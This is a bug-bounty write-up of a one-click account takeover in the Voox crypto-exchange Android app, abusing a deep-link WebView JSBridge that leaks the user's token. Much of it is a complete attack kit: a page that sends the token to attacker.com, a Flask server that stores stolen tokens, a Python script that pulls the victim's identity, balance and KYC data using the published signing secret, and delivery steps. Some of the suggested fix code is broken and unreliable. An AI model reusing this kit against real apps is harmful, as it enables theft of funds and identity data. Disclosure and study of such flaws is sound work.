---
layout: post
title: "1-Click Account Takeover (ATO) in Voox Android"
subtitle: "JSBridge Exploitation + Hardcoded API Secret = Critical Vulnerability"
date: 2026-04-02
last_modified_at: 2026-04-02
categories: [Bug Hunting, Mobile Security]
tags: [Android, JSBridge, Account Takeover, Cryptocurrency, Bug Bounty, Mobile Security]
author: Security Researcher
---

# Hello folks, it's me again!

When I started digging into mobile security a few months back, I kept reading about JSBridge vulnerabilities. Every article made them sound theoretical -- like academic stuff you'd find in a conference paper, not in an app sitting in the Play Store with real users and real money on the line. I was wrong about that.

This is the story of how I found a critical account takeover vulnerability in the Voox cryptocurrency exchange app -- a chain so clean it felt almost too easy. I'm sharing the full technical breakdown, the exploit code, and an honest look at what happened when I reported it.

Spoiler: I got paid $50 for a CRITICAL bug. We'll talk about that too.

---

## How I Found It

I was sitting with JADX open, poking at Voox's decompiled source. Within a couple of hours I had the full chain mapped out -- an exported activity with no URL validation, a WebView that happily loads anything you throw at it, and a JSBridge that hands over the user's master authentication token to literally any JavaScript that asks.

I built the exploit the same day and reported it immediately. By the next morning Voox had confirmed it was critical. By April 2 the fix was live and I had my bounty in hand.

This writeup covers:
1. The full vulnerability chain (URL injection -> JSBridge -> token leak)
2. Escalating to complete account takeover with the hardcoded signing secret
3. The honest conversation about crypto bounties and $50 for a 9.8 CVSS

---

## Summary: The Vulnerability

Voox is a cryptocurrency exchange. Users trust it with their funds, their KYC identity documents, and their personal data. The vulnerability chain I found lets an attacker steal all of that -- crypto balance, email, phone number, real name, everything -- with a single click on a malicious link.

Here's the chain at a glance:
- The app accepts arbitrary URLs from deep links with no domain validation
- Those URLs are loaded directly in a WebView -- no origin checks
- The WebView exposes a JSBridge that leaks the user's master authentication token to any page
- The APK ships with a hardcoded API signing secret that lets you forge authenticated requests

One click. Full account takeover.

---

## Part 1: Finding URL Injection & JSBridge Exposure

### Step 1: Analyzing AndroidManifest.xml

The app declares an exported activity that accepts HTTP/HTTPS URLs:

```xml
<activity 
    android:name="com.explus.main.home.ui.X1NewMainActivity"
    android:exported="true"
    android:launchMode="singleTask">
    
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        
        <data android:scheme="voox"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="*/*"/>
    </intent-filter>
</activity>
```

This activity accepts deep links like `voox://https://attacker.com/poc.html` and HTTP/HTTPS URLs without any domain validation.

### Step 2: URL Handling Without Validation

When the intent is received, the activity extracts the URL and passes it to the URL scheme handler:

**In X1NewMainActivity.java:**
```java
public void handleIntent() {
    Intent intent2 = this.getIntent();
    Uri data = intent2.getData();
    String urlString = data.toString();  // No validation here
    
    // Extracts pushUrl parameter from intent extras
    String pushUrl = intent2.getStringExtra("pushUrl");
    if (pushUrl != null) {
        urlString = pushUrl;  // User-provided URL, no sanitization
    }
    
    // Routes directly to WebView activity
    HomeUtil.handleUrlScheme(urlString);
}
```

**In HomeUtil.java:**
```java
public static void handleUrlScheme(String url) {
    // No allowlist check, no domain validation
    if (url.startsWith("http://") || url.startsWith("https://")) {
        Intent intent = new Intent(context, X1ItemDetailActivity.class);
        intent.putExtra("url", url);  // Passed directly
        context.startActivity(intent);
    }
}
```

### Step 3: WebView Initialization with Unprotected JSBridge

The WebView is created in `X1ItemDetailActivity` with DSBridge enabled:

**In X1ItemDetailActivity.java:**
```java
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    
    // Initialize WebView
    DWebView dWebView = new DWebView(this);
    
    // Add JSBridge handlers - NO ORIGIN VALIDATION
    dWebView.addJavascriptInterface(new JsApi(), "exchange");
    dWebView.setWebViewClient(new WebViewClient() {
        @Override
        public void onPageFinished(WebView view, String url) {
            // Initialize DSBridge
            dWebView.loadUrl("javascript:initDSBridge()");
        }
    });
    
    // Load the URL from intent (attacker-controlled)
    String url = getIntent().getStringExtra("url");
    dWebView.loadUrl(url);  // No origin check
    setContentView(dWebView);
}
```

### Step 4: Sensitive JSBridge Method Exposure

The app exposes the `exchangeInfo` method which returns the master authentication token:

**In JsApi.java (class h0):**
```java
public class h0 {
    
    @JavascriptInterface
    public String exchangeInfo() {
        // Returns user's master token to ANY JavaScript code
        UserDataService userService = UserDataService.getInstance();
        String token = userService.getToken();  // Master authentication token
        String language = userService.getLanguage();
        String theme = userService.getTheme();
        
        JSONObject result = new JSONObject();
        result.put("exchange_token", token);  // CRITICAL: Leaks master token
        result.put("exchange_lan", language);
        result.put("exchange_skin", theme);
        
        return result.toString();
    }
}
```

This method is called whenever ANY web page loads in the WebView, with no validation of origin or URL.

### Step 5: Token Leakage via JavaScript

An attacker-controlled page can immediately steal this token:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Voox Security Audit</title>
    <script src="https://unpkg.com/dsbridge@3.1.3/dist/dsbridge.js"></script>
</head>
<body>
    <h1>Security Check in Progress...</h1>
    <script>
        // Called automatically when page loads in the app's WebView
        function stolen(data) {
            // data contains: {"exchange_token": "...", "exchange_lan": "...", ...}
            const token = JSON.parse(data).exchange_token;
            console.log("Master Token: " + token);
            
            // Send to attacker server
            fetch("http://attacker.com/log?token=" + encodeURIComponent(token));
            
            // Also leak device identifiers from HTTP headers
            fetch("http://attacker.com/headers").then(r => r.text());
        }
        
        // Call the exposed bridge method
        if (window._dsbridge) {
            _dsbridge.call("exchangeInfo", {}, stolen);
        }
    </script>
</body>
</html>
```

**Vulnerability Chain:**
1. Exported activity accepts arbitrary URLs (no validation)
2. URL loaded in WebView without origin checks
3. JSBridge exposes sensitive token to any JavaScript
4. Attacker can steal token with one click

---

## Part 2: Getting Account Takeover via Hardcoded Secret

### Step 1: Discovering the Hardcoded API Signing Secret

During APK analysis, I found the signing secret hardcoded in the app:

**In DataHandler.java:**
```java
public class DataHandler {
    
    private static final String SIGNING_SECRET = "jiaoyisuo@2017";
    
    public static void signRequest(Map<String, String> params) {
        // MD5(sorted_params + secret) signing
        ArrayList<String> keys = new ArrayList<>(params.keySet());
        Collections.sort(keys);
        
        StringBuilder sb = new StringBuilder();
        for (String key : keys) {
            sb.append(key);
            sb.append(params.get(key));
        }
        sb.append(SIGNING_SECRET);  // <- HARDCODED SECRET
        
        String sign = MD5.hash(sb.toString());
        params.put("sign", sign);
    }
}
```

This secret is used to sign **ALL** backend API requests. An attacker with a stolen token + this secret can impersonate the user.

### Step 2: Backend API Endpoints Accessible via Stolen Token

With the token, an attacker can call these protected endpoints:

**Network Interceptor (NetInterceptor.java):**
```java
public Response intercept(Chain chain) throws IOException {
    HttpUrl url = chain.request().url();
    Request.Builder requestBuilder = chain.request().newBuilder();
    
    // Add authentication token to every request
    requestBuilder.addHeader("exchange-token", getUserToken());
    requestBuilder.addHeader("exchange-client", "app");
    requestBuilder.addHeader("Platform-CU", "android");
    
    return chain.proceed(requestBuilder.build());
}
```

All API requests to `https://egw.voox.com` require this `exchange-token` header. With the stolen token, an attacker can make requests like:

### Step 3: Complete Exfiltration Script

Once the token is stolen, use this to access everything:

```python
#!/usr/bin/env python3
import requests
import hashlib
import json
import time
import sys

def get_sign(params, secret):
    """Sign API requests using the hardcoded secret algorithm"""
    sorted_keys = sorted(params.keys())
    sb = ""
    for key in sorted_keys:
        sb += str(key)
        sb += str(params[key])
    sb += secret
    return hashlib.md5(sb.encode('utf-8')).hexdigest()

def exfiltrate_account(token):
    """
    Complete account takeover using stolen token
    Demonstrates access to:
    - User identity (email, phone, real name)
    - All cryptocurrency holdings
    - KYC verification data
    - Trading history
    """
    base_url = "https://egw.voox.com"
    secret = "jiaoyisuo@2017"  # Hardcoded in APK
    
    headers = {
        "exchange-token": token,
        "exchange-client": "app",
        "exchange-language": "en_US",
        "Platform-CU": "android",
        "Content-Type": "application/json;charset=utf-8",
        "User-Agent": "okhttp/4.9.2"
    }
    
    # Endpoints accessible via stolen token
    endpoints = [
        ("User Profile", "/egw/private/increment/user/info"),
        ("Personal Identity", "/egw/private/futures/personal/info"),
        ("Account Balance", "/egw/private/spot/account/total_account_balance"),
        ("KYC Info", "/egw/private/common/get_kyc_info"),
        ("Identity Auth", "/egw/private/security/get_identity_auth_info"),
        ("Reward Center", "/egw/private/reward_center_info"),
        ("Trading History", "/egw/private/spot/account/trades")
    ]
    
    print("[*] Starting full account exfiltration...")
    print(f"[*] Using token: {token[:20]}...")
    
    for endpoint_name, endpoint_path in endpoints:
        print(f"\n[+] Fetching {endpoint_name}...")
        
        # Create signed request
        timestamp = str(int(time.time() * 1000))
        params = {"time": timestamp}
        
        # Add endpoint-specific parameters
        if "balance" in endpoint_path:
            params["quoteCoin"] = "USDT"
        if "trades" in endpoint_path:
            params["limit"] = "100"
        
        # Sign the request using hardcoded secret
        params["sign"] = get_sign(params, secret)
        
        try:
            # Make authenticated request
            response = requests.post(
                base_url + endpoint_path,
                headers=headers,
                json=params,
                timeout=10
            )
            
            print(f"    Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                
                # Parse response based on endpoint
                if endpoint_name == "User Profile":
                    print(f"    UID: {data.get('data', {}).get('uid')}")
                    print(f"    VIP Level: {data.get('data', {}).get('vip_level')}")
                    
                elif endpoint_name == "Personal Identity":
                    user_data = data.get('data', {})
                    print(f"    Email: {user_data.get('email')}")
                    print(f"    Phone: {user_data.get('phone')}")
                    print(f"    Real Name: {user_data.get('real_name')}")
                    
                elif endpoint_name == "Account Balance":
                    balance = data.get('data', {}).get('total_balance_quote')
                    print(f"    Total Balance (USDT): {balance}")
                    
                elif endpoint_name == "KYC Info":
                    kyc = data.get('data', {})
                    print(f"    KYC Status: {kyc.get('review_status')}")
                    print(f"    ID Type: {kyc.get('id_type')}")
                    
                # Print full response for completeness
                print(f"    Full Response:\n{json.dumps(data, indent=6)}")
            else:
                print(f"    Error: {response.text[:200]}")
                
        except Exception as e:
            print(f"    [!] Request failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Voox ATO Exfiltration Script")
        print("Usage: python3 voox_ato.py <exchange_token>")
        print("\nExample:")
        print("   python3 voox_ato.py <REDACTED_TOKEN>")
        sys.exit(1)
    
    token = sys.argv[1]
    exfiltrate_account(token)
```

**Usage:**
```bash
# Step 1: Victim clicks malicious link, server captures token
python3 voox_server.py

# Step 2: Attacker runs exfiltration with stolen token
python3 voox_ato.py <REDACTED_TOKEN>

# Output includes personal info, balance, KYC data, etc.
```

---



---

## Proof of Concept

### PoC Demo Video

<video width="100%" controls style="border-radius:8px;">
  <source src="/assets/videos/voox-ato-poc.mp4" type="video/mp4">
  Your browser does not support the video tag. You can <a href="/assets/videos/voox-ato-poc.mp4">download the video here</a>.
</video>

*Click play above to watch the 1-click ATO in action.*

### Complete 1-Click Attack

**attacker_page.html:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Security Audit - Voox</title>
    <script src="https://unpkg.com/dsbridge@3.1.3/dist/dsbridge.js"></script>
</head>
<body style="background: #f0f0f0; font-family: Arial; padding: 50px; text-align: center;">
    <div id="status" style="font-size: 20px; color: #333;">
        <h1>Security Audit in Progress</h1>
        <p id="message">Checking authentication token...</p>
    </div>
    
    <script>
        const statusEl = document.getElementById('status');
        const msgEl = document.getElementById('message');
        
        function onTokenReceived(data) {
            try {
                const tokenData = JSON.parse(data);
                const token = tokenData.exchange_token;
                
                msgEl.innerHTML = "OK Token verified<br><span style='color: green; font-weight: bold;'>Session valid</span>";
                
                // Send to attacker server
                fetch("http://attacker.com/log?token=" + encodeURIComponent(token) + 
                      "&time=" + Date.now());
                      
                console.log("Token stolen: " + token);
            } catch(e) {
                msgEl.innerHTML = "Error: " + e.message;
            }
        }
        
        function triggerExploit() {
            if (window._dsbridge) {
                msgEl.innerHTML = "DSBridge found! Authenticating...";
                _dsbridge.call("exchangeInfo", {}, onTokenReceived);
            } else {
                setTimeout(triggerExploit, 500);
            }
        }
        
        // Start exploit immediately
        setTimeout(triggerExploit, 100);
    </script>
</body>
</html>
```

**Server to capture tokens:**
```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/log')
def log_token():
    token = request.args.get('token', 'NONE')
    timestamp = request.args.get('time', 'UNKNOWN')
    
    print(f"\n[+] TOKEN EXFILTRATED!")
    print(f"    Time: {timestamp}")
    print(f"    Token: {token}")
    print(f"    User-Agent: {request.headers.get('User-Agent')}")
    print(f"    IP: {request.remote_addr}")
    
    # Save to file for later use
    with open("stolen_tokens.txt", "a") as f:
        f.write(f"{timestamp},{token}\n")
    
    return "OK"

@app.route('/')
def index():
    return open('attacker_page.html').read()

if __name__ == '__main__':
    app.run(port=8000, debug=False)
```

**Attack execution:**
```bash
# 1. Start attacker server
python3 attacker_server.py
# Output: Running on http://localhost:8000

# 2. Expose publicly (e.g., Cloudflare)
cloudflare tunnel run voox-exploit
# Output: https://awesome-domain.trycloudflare.com

# 3. Send link to victim
# https://awesome-domain.trycloudflare.com/

# 4. Victim clicks link, token is stolen
cat stolen_tokens.txt
# Output: 1680000000000,<REDACTED_TOKEN>

# 5. Use token to exfiltrate account
python3 voox_ato.py <REDACTED_TOKEN>
```

---

## Vulnerability Fixes

### Fix 1: URL Validation - Implement Strict Allowlist

**In HomeUtil.java:**
```java
public static final String[] ALLOWED_DOMAINS = {
    "voox.world",
    "api.voox.world",
    "cdn.voox.world"
};

public static void handleUrlScheme(String url) {
    // BEFORE: No validation
    // Intent intent = new Intent(context, X1ItemDetailActivity.class);
    // intent.putExtra("url", url);
    
    // AFTER: Strict allowlist
    if (!isUrlAllowed(url)) {
        Log.e("Security", "Blocked unauthorized URL: " + url);
        Toast.makeText(context, "Invalid URL", Toast.LENGTH_SHORT).show();
        return;
    }
    
    Intent intent = new Intent(context, X1ItemDetailActivity.class);
    intent.putExtra("url", url);
    context.startActivity(intent);
}

private static boolean isUrlAllowed(String url) {
    try {
        URL urlObj = new URL(url);
        String host = urlObj.getHost();
        
        for (String domain : ALLOWED_DOMAINS) {
            if (host.equals(domain) || host.endsWith("." + domain)) {
                return true;
            }
        }
        return false;
    } catch (Exception e) {
        return false;
    }
}
```

### Fix 2: JSBridge Origin Validation

**In X1ItemDetailActivity.java:**
```java
// BEFORE: No origin check
dWebView.addJavascriptInterface(new JsApi(), "exchange");

// AFTER: Origin validation
dWebView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldInterceptRequest(WebView view, 
            WebResourceRequest request) {
        
        // Validate origin before allowing JSBridge
        String url = request.getUrl().toString();
        if (!isApprovedOrigin(url)) {
            Log.w("Security", "Blocked JSBridge access from: " + url);
            return true;  // Block the request
        }
        return false;
    }
    
    private boolean isApprovedOrigin(String url) {
        return url.startsWith("voox://") || 
               url.startsWith("https://voox.world") ||
               url.startsWith("https://api.voox.world");
    }
});
```

### Fix 3: Stop Exposing Master Token via JSBridge

**In JsApi.java - BEFORE:**
```java
@JavascriptInterface
public String exchangeInfo() {
    // VULNERABLE: Returns master token to any JavaScript
    return "{\"exchange_token\": \"" + token + "\"}";
}
```

**AFTER:**
```java
@JavascriptInterface
public String exchangeInfo() {
    // SAFE: Generate temporary single-use token
    String temporaryToken = TokenManager.generateTemporaryToken(3600); // 1 hour
    
    return "{\"temporary_token\": \"" + temporaryToken + 
           "\",\"expires_in\": 3600}";
}

// Use temporary tokens for limited API access only
// Never expose master authentication token to JavaScript
```

### Fix 4: Remove Hardcoded Secret - Move to Backend

**BEFORE (BAD):**
```java
private static final String SIGNING_SECRET = "jiaoyisuo@2017";

// App signs requests locally
params.put("sign", MD5.hash(params + secret));
```

**AFTER (GOOD):**
```java
// Backend generates signature
// App only sends token + request data
// Server validates and signs

public static void signRequest(Map<String, String> params) {
    // Send to server for signing
    Response response = apiClient.post("/sign", params);
    String signature = response.getString("signature");
    params.put("sign", signature);
}
```

### Fix 5: Certificate Pinning

**In ApiClient.java:**
```java
public static OkHttpClient createClientWithPinning() {
    CertificatePinner certificatePinner = new CertificatePinner.Builder()
        .add("egw.voox.com", "sha256/ABC123DEF456=")
        .add("api.voox.world", "sha256/XYZ789UVW012=")
        .build();

    return new OkHttpClient.Builder()
        .certificatePinner(certificatePinner)
        .build();
}
```

---

## Timeline & The Real Story: Fast-Track Resolution

Here's how this vulnerability was handled from discovery to bounty:

| Date | Event | Status |
|------|-------|--------|
| **March 26, 2026** | Discovered ATO vulnerability in Voox | CRITICAL |
| **March 26, 2026** | Reported to Voox security team | Same day |
| **March 26, 2026** | Received acknowledgment | Quick response |
| **March 27, 2026** | Team confirmed CRITICAL severity | Next day |
| **April 1, 2026** | Fixed version 1.4.9 released | Patched |
| **April 2, 2026** | Bounty awarded: **$50 USDT** | Direct payment |
| **April 2, 2026** | Public disclosure (responsible) | This writeup |

---

## The Bounty Reality Check

$50 USDT for a CRITICAL 9.8 CVSS vulnerability on a live crypto exchange. That's what I got. Let's talk about it honestly.

When the bounty notification came through I genuinely had to re-read it. The bug gives an attacker full access to a user's crypto holdings, their identity documents, their real name, phone, email -- and I walked away with fifty dollars. That's less than what I'd bill for an hour of freelance work.

For context, this is a bug that affects:

**$50 for a 9.8 CVSS vulnerability on a crypto exchange. I spent about 4-5 hours on the research. Do the math.**

To Voox's credit, they paid in direct USDT -- not trading credits, not tokens on their own platform. And their response time was genuinely fast: reported on March 26, confirmed critical the next day, patched by April 1. That part I respect.

But the bounty amount? That tells you something about how seriously a platform takes security. A $50 payout on a bug that could drain user funds is a signal that security research is an afterthought, not a priority.

I reported it anyway because the right thing to do was report it. But if you're deciding which programs to spend your time on, look for platforms with transparent bounty ranges, a track record of fair payouts, and a security team that treats researchers like partners -- not problems to be minimized.

---

## What I Took Away From This

Honestly? A lot more than fifty dollars.

Finding a vulnerability like this early in your mobile security journey is a reminder that real-world apps are not written by people who read the OWASP Mobile Testing Guide. They're written by teams under deadline pressure, shipping features fast, and security is often the thing that gets cut first. The bugs are out there. This one took me a few hours to find.

The $50 doesn't bother me as much as it might sound. What bothered me was that the payout amount signals something about how much a platform values the people who help protect their users. Bug bounty is a partnership -- researchers invest real time and skill, and programs should reflect that with fair compensation.

That said, I reported it. Voox fixed it fast. Users are safer because of it. At the end of the day that's what this work is actually about.

If you're starting out in mobile security, don't let low bounties stop you from doing the research. Let them inform which programs you prioritize. The skills you build hunting bugs on any platform are yours to keep regardless of what you get paid.

---

## References & Further Reading

- [OWASP Android Security Testing Guide](https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide)
- [JSBridge Security Issues](https://httptoolkit.tech/blog/jsbridge-exploitation/)
- [Play Core Library Dynamic Code Loading](https://developer.android.com/guide/playcore)
- [Hardcoded Secrets in APKs](https://owasp.org/www-community/Use_of_Hard-coded_Password)
- [Certificate Pinning Best Practices](https://developer.android.com/training/articles/security-tips)
- [HackerOne Resources](https://www.hackerone.com/resources)
- [Bugcrowd Security Research](https://www.bugcrowd.com/)

---

## Final Words

If you're starting out in security research like I was, learn from my experience. Hunt smart, report responsibly, and value your own time. The $50 doesn't matter--the skills and portfolio do.

And if you find critical bugs in platforms with terrible bounty programs? That's when this kind of public research becomes your real reward.

Stay curious. Stay secure. Hunt smart.

**Have questions about this research?** Feel free to reach out on Twitter or via security contact.

*Last Updated: April 2, 2026*
*Lessons Learned: April 2, 2026*
